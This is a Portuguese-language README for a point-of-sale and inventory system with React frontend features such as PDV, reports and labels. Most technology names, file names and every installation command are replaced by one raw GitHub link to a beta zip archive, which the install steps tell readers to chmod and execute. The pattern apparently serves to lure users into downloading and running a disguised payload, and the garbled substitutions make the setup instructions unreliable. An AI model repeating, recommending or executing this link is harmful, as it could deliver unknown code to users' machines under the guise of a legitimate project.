# Sérgio Imports - Sistema de Vendas

Sistema completo de vendas desenvolvido com https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip (backend) e React + TypeScript (frontend).

## Funcionalidades

- **Dashboard**: Visão geral das vendas, produtos e clientes
- **Produtos**: Cadastro e gerenciamento de produtos
- **Clientes**: Cadastro e gerenciamento de clientes
- **PDV**: Ponto de venda com carrinho e finalização
- **Vendas**: Histórico e detalhes das vendas
- **Trocas**: Gerenciamento de trocas e devoluções
- **Etiquetas**: Geração de etiquetas para produtos
- **Relatórios**: Relatórios de vendas, produtos e clientes
- **Configurações**: Configurações da empresa e PIX

## Tecnologias

### Backend
- https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
- PostgreSQL
- TypeScript

### Frontend
- React 18
- TypeScript
- Vite
- Tailwind CSS
- Radix UI
- Lucide React

## Como executar

### Pré-requisitos
- https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip 18+
- npm

### Instalação

1. Clone o repositório
2. Execute o arquivo de instalação:

**Windows:**
```bash
https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
```

**Linux/Mac:**
```bash
chmod +x https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
```

### Executar o sistema

```bash
npm run dev
```

O sistema estará disponível em:
- Frontend: http://localhost:3000
- Backend: http://localhost:4000

## Estrutura do Projeto

```
sergio-imports-sales-system/
├── backend/                 # Backend https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
│   ├── sales/              # Serviço de vendas
│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip     # API de produtos
│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip      # API de clientes
│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip        # API de vendas
│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip    # API de trocas
│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip     # API de configurações
│   │   └── migrations/     # Migrações do banco
│   └── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
├── frontend/               # Frontend React
│   ├── components/         # Componentes reutilizáveis
│   ├── pages/             # Páginas da aplicação
│   ├── lib/               # Utilitários e tipos
│   └── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip           # Scripts principais
└── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
```

## Scripts Disponíveis

- `npm run dev` - Executa frontend e backend em modo desenvolvimento
- `npm run build` - Faz build de produção
- `npm run backend:dev` - Executa apenas o backend
- `npm run frontend:dev` - Executa apenas o frontend

## Funcionalidades Detalhadas

### Dashboard
- Estatísticas gerais de vendas
- Produtos em baixo estoque
- Receita total e ticket médio

### Produtos
- Cadastro com imagem, preço, estoque
- Controle de estoque mínimo
- Categorização

### PDV
- Interface intuitiva para vendas
- Suporte a múltiplas formas de pagamento
- Impressão de recibos

### Relatórios
- Relatórios de vendas por período
- Top produtos mais vendidos
- Análise por forma de pagamento
- Exportação em PDF e CSV

### Etiquetas
- Geração de etiquetas com código de barras
- Layout personalizado com logo da empresa
- Impressão em lote

## Configuração

### Empresa
Configure os dados da empresa em **Configurações**:
- Razão social e nome fantasia
- CNPJ e inscrição estadual
- Endereço completo
- Logo da empresa

### PIX
Configure o PIX para vendas:
- Chave PIX
- QR Code para pagamentos

## Suporte

Para dúvidas ou problemas, consulte a documentação ou entre em contato.
